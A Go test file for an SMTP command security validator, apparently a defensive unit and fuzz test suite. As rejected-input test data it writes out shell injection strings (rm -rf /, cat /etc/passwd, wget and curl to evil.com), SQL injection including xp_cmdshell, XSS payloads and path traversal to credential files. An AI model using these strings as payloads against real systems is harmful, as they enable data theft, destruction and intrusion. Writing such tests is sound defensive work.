package smtp

import (
	"context"
	"log/slog"
	"os"
	"testing"
)

func TestCommandSecurityManager(t *testing.T) {
	// Create a test logger
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))

	// Create command security manager
	csm := NewCommandSecurityManager(logger)
	ctx := context.Background()

	t.Run("Valid Commands", func(t *testing.T) {
		validCommands := []string{
			"HELO example.com",
			"EHLO mail.example.com",
			"MAIL FROM:<test@example.com>",
			"MAIL FROM:<user+tag@example.com>",
			"MAIL FROM:<user_name@example.com>",
			"MAIL FROM:<user-name@example.com>",
			"RCPT TO:<user@example.com>",
			"RCPT TO:<user+tag@example.com>",
			"DATA",
			"RSET",
			"NOOP",
			"QUIT",
			"AUTH PLAIN",
			"STARTTLS",
			"HELP",
			"VRFY user@example.com",
			"EXPN list@example.com",
		}

		for _, cmd := range validCommands {
			t.Run(cmd, func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, cmd); err != nil {
					t.Errorf("Valid command rejected: %s, error: %v", cmd, err)
				}
			})
		}
	})

	t.Run("Invalid Commands", func(t *testing.T) {
		invalidCommands := []struct {
			command string
			reason  string
		}{
			{"", "empty command"},
			{"   ", "whitespace only"},
			{"UNKNOWN", "unknown command"},
			{"HELO\x00example.com", "null byte injection"},
			{"HELO example.com; DROP TABLE users", "command injection"},
			{"HELO example.com | cat /etc/passwd", "pipe injection"},
			{"HELO example.com && rm -rf /", "logical operator injection"},
			{"HELO example.com`id`", "backtick injection"},
			{"HELO example.com$(whoami)", "command substitution"},
			{"HELO example.com<script>alert('xss')</script>", "script injection"},
			{"HELO ../../../etc/passwd", "path traversal"},
			{"HELO example.com\r\nMAIL FROM:<test@example.com>", "CRLF injection"},
			{"HELO example.com\nMAIL FROM:<test@example.com>", "LF injection"},
			{"HELO example.com\rMAIL FROM:<test@example.com>", "CR injection"},
		}

		for _, tc := range invalidCommands {
			t.Run(tc.reason, func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, tc.command); err == nil {
					t.Errorf("Invalid command accepted: %s (reason: %s)", tc.command, tc.reason)
				}
			})
		}
	})

	t.Run("Command Length Limits", func(t *testing.T) {
		// Test command that's too long
		longCommand := "HELO " + string(make([]byte, 600)) // Exceeds 512 char limit
		if err := csm.ValidateCommand(ctx, longCommand); err == nil {
			t.Error("Long command should be rejected")
		}

		// Test valid length command
		validCommand := "HELO example.com" // Simple valid command
		if err := csm.ValidateCommand(ctx, validCommand); err != nil {
			t.Errorf("Valid length command rejected: %v", err)
		}
	})

	t.Run("Parameter Validation", func(t *testing.T) {
		invalidParams := []struct {
			command string
			reason  string
		}{
			{"MAIL FROM:", "missing address"},
			{"MAIL FROM:invalid-email", "invalid email format"},
			{"MAIL FROM:<invalid@>", "invalid email format"},
			{"MAIL FROM:<@example.com>", "invalid email format"},
			{"RCPT TO:", "missing address"},
			{"RCPT TO:invalid-email", "invalid email format"},
			{"AUTH INVALID", "invalid auth mechanism"},
		}

		for _, tc := range invalidParams {
			t.Run(tc.reason, func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, tc.command); err == nil {
					t.Errorf("Invalid parameter accepted: %s (reason: %s)", tc.command, tc.reason)
				}
			})
		}
	})

	t.Run("Hostname Validation", func(t *testing.T) {
		invalidHostnames := []string{
			".",
			"..",
			"-example.com",
			"example-.com",
			"example..com",
			"example.com-",
			"example@com",
			"example com",
			"example\x00.com",
			"example.com; DROP TABLE users",
		}

		for _, hostname := range invalidHostnames {
			t.Run(hostname, func(t *testing.T) {
				cmd := "HELO " + hostname
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("Invalid hostname accepted: %s", hostname)
				}
			})
		}
	})

	t.Run("Email Address Validation", func(t *testing.T) {
		invalidEmails := []string{
			"invalid",
			"@example.com",
			"user@",
			"user@.com",
			"user@example",
			"user@example.",
			"user@@example.com",
			"user@example..com",
			"user\x00@example.com",
			"user@example.com; DROP TABLE users",
		}

		for _, email := range invalidEmails {
			t.Run(email, func(t *testing.T) {
				cmd := "MAIL FROM:<" + email + ">"
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("Invalid email accepted: %s", email)
				}
			})
		}
	})

	t.Run("SQL Injection Prevention", func(t *testing.T) {
		sqlInjectionCommands := []string{
			"HELO example.com; DROP TABLE users",
			"HELO example.com UNION SELECT * FROM users",
			"HELO example.com' OR '1'='1",
			"HELO example.com\" OR \"1\"=\"1",
			"HELO example.com; INSERT INTO users VALUES ('hacker', 'password')",
			"HELO example.com; UPDATE users SET password='hacked'",
			"HELO example.com; DELETE FROM users",
			"HELO example.com; CREATE TABLE backdoor (id INT)",
			"HELO example.com; ALTER TABLE users ADD COLUMN hacked BOOLEAN",
			"HELO example.com; EXEC xp_cmdshell('format c:')",
		}

		for _, cmd := range sqlInjectionCommands {
			t.Run(cmd, func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("SQL injection command accepted: %s", cmd)
				}
			})
		}
	})

	t.Run("Command Injection Prevention", func(t *testing.T) {
		commandInjectionCommands := []string{
			"HELO example.com; cat /etc/passwd",
			"HELO example.com | whoami",
			"HELO example.com && rm -rf /",
			"HELO example.com || echo 'hacked'",
			"HELO example.com`id`",
			"HELO example.com$(whoami)",
			"HELO example.com; wget http://evil.com/backdoor.sh",
			"HELO example.com; curl http://evil.com/steal-data",
		}

		for _, cmd := range commandInjectionCommands {
			t.Run(cmd, func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("Command injection accepted: %s", cmd)
				}
			})
		}
	})

	t.Run("Script Injection Prevention", func(t *testing.T) {
		scriptInjectionCommands := []string{
			"HELO example.com<script>alert('xss')</script>",
			"HELO example.com<javascript>alert('xss')</javascript>",
			"HELO example.com<vbscript>msgbox('xss')</vbscript>",
			"HELO example.com onload=alert('xss')",
			"HELO example.com onerror=alert('xss')",
		}

		for _, cmd := range scriptInjectionCommands {
			t.Run(cmd, func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("Script injection accepted: %s", cmd)
				}
			})
		}
	})

	t.Run("Path Traversal Prevention", func(t *testing.T) {
		pathTraversalCommands := []string{
			"HELO ../../../etc/passwd",
			"HELO ..\\..\\..\\windows\\system32\\config\\sam",
			"HELO ../../../../etc/shadow",
			"HELO ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		}

		for _, cmd := range pathTraversalCommands {
			t.Run(cmd, func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("Path traversal accepted: %s", cmd)
				}
			})
		}
	})

	t.Run("Control Character Prevention", func(t *testing.T) {
		controlCharCommands := []string{
			"HELO example.com\x00",
			"HELO example.com\x01",
			"HELO example.com\x02",
			"HELO example.com\x03",
			"HELO example.com\x04",
			"HELO example.com\x05",
			"HELO example.com\x06",
			"HELO example.com\x07",
			"HELO example.com\x08",
			"HELO example.com\x0B",
			"HELO example.com\x0C",
			"HELO example.com\x0E",
			"HELO example.com\x0F",
			"HELO example.com\x7F",
		}

		for _, cmd := range controlCharCommands {
			t.Run("control_char", func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("Control character command accepted: %q", cmd)
				}
			})
		}
	})

	t.Run("CRLF Injection Prevention", func(t *testing.T) {
		crlfInjectionCommands := []string{
			"HELO example.com\r\nMAIL FROM:<test@example.com>",
			"HELO example.com\nMAIL FROM:<test@example.com>",
			"HELO example.com\rMAIL FROM:<test@example.com>",
			"HELO example.com\r\n\r\nMAIL FROM:<test@example.com>",
		}

		for _, cmd := range crlfInjectionCommands {
			t.Run("crlf_injection", func(t *testing.T) {
				if err := csm.ValidateCommand(ctx, cmd); err == nil {
					t.Errorf("CRLF injection accepted: %q", cmd)
				}
			})
		}
	})

	t.Run("Command Canonicalization", func(t *testing.T) {
		// Test that commands are properly canonicalized
		testCases := []struct {
			input    string
			expected string
		}{
			{"  HELO   example.com  ", "HELO example.com"},
			{"HELO    example.com", "HELO example.com"},
			{"HELO\texample.com", "HELO example.com"},
		}

		for _, tc := range testCases {
			t.Run(tc.input, func(t *testing.T) {
				// The validation should pass, but we can't easily test the canonicalization
				// without exposing internal methods. We just verify it doesn't error.
				if err := csm.ValidateCommand(ctx, tc.input); err != nil {
					t.Errorf("Canonicalization failed for input: %q, error: %v", tc.input, err)
				}
			})
		}
	})

	t.Run("SanitizeCommand", func(t *testing.T) {
		testCases := []struct {
			input    string
			expected string
		}{
			{"HELO example.com", "HELO example.com"},
			{"HELO example.com\x00", "HELO example.com\\x00"},
			{"HELO example.com\x01", "HELO example.com\\x01"},
			{"HELO example.com\x7F", "HELO example.com\\x7F"},
		}

		for _, tc := range testCases {
			t.Run(tc.input, func(t *testing.T) {
				result := csm.SanitizeCommand(tc.input)
				if result != tc.expected {
					t.Errorf("SanitizeCommand(%q) = %q, expected %q", tc.input, result, tc.expected)
				}
			})
		}
	})

	t.Run("GetSecurityStats", func(t *testing.T) {
		stats := csm.GetSecurityStats()

		expectedKeys := []string{
			"max_command_length",
			"max_parameter_length",
			"strict_mode",
			"log_suspicious",
			"blocked_patterns",
		}

		for _, key := range expectedKeys {
			if _, exists := stats[key]; !exists {
				t.Errorf("Security stats missing key: %s", key)
			}
		}

		// Check specific values
		if stats["max_command_length"] != 512 {
			t.Errorf("Expected max_command_length to be 512, got %v", stats["max_command_length"])
		}

		if stats["strict_mode"] != true {
			t.Errorf("Expected strict_mode to be true, got %v", stats["strict_mode"])
		}
	})
}

// Benchmark tests for performance
func BenchmarkCommandValidation(b *testing.B) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	csm := NewCommandSecurityManager(logger)
	ctx := context.Background()

	validCommand := "HELO example.com"
	invalidCommand := "HELO example.com; DROP TABLE users"

	b.Run("ValidCommand", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			csm.ValidateCommand(ctx, validCommand)
		}
	})

	b.Run("InvalidCommand", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			csm.ValidateCommand(ctx, invalidCommand)
		}
	})
}

// Fuzzing test for comprehensive coverage
func FuzzCommandValidation(f *testing.F) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	csm := NewCommandSecurityManager(logger)
	ctx := context.Background()

	// Add seed corpus
	f.Add("HELO example.com")
	f.Add("MAIL FROM:<test@example.com>")
	f.Add("RCPT TO:<user@example.com>")
	f.Add("DATA")
	f.Add("QUIT")
	f.Add("HELO example.com; DROP TABLE users")
	f.Add("HELO example.com\x00")
	f.Add("HELO example.com<script>alert('xss')</script>")

	f.Fuzz(func(t *testing.T, command string) {
		// The validation should either pass or fail gracefully
		// We don't want it to panic or crash
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Command validation panicked for input %q: %v", command, r)
			}
		}()

		// Validate the command
		err := csm.ValidateCommand(ctx, command)

		// If validation fails, the error should be a proper SMTP error
		if err != nil {
			errorStr := err.Error()
			// Check that it's a proper SMTP error format (XXX Y.Y.Y message)
			if len(errorStr) < 3 || errorStr[3] != ' ' {
				t.Errorf("Invalid error format for command %q: %s", command, errorStr)
			}
		}
	})
}
